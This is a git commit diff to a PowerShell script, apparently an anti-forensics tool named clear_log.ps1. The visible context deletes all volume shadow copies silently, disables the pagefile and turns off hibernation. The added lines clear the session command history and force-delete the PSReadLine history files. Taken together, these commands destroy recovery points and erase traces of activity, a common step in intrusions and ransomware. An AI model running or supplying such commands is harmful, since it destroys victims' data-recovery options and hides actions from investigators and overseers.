069006f5d30658536d1a9195d912af1dcc406cc7
HamidReza Mohseniyan <82676693+jxroot@users.noreply.github.com>
2024-10-14 13:30:29 +0330

    Update clear_log.ps1

--- PowerShell/clear_log.ps1
+++ PowerShell/clear_log.ps1
@@ -12,3 +12,12 @@ vssadmin delete shadows /all /quiet
 # Disable pagefile and hibernation
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value ""
 powercfg -h off
+# Clear current session command history
+Clear-History
+
+# Clear console window (optional)
+Clear-Host
+
+# Remove persistent history files
+Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
+Remove-Item "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
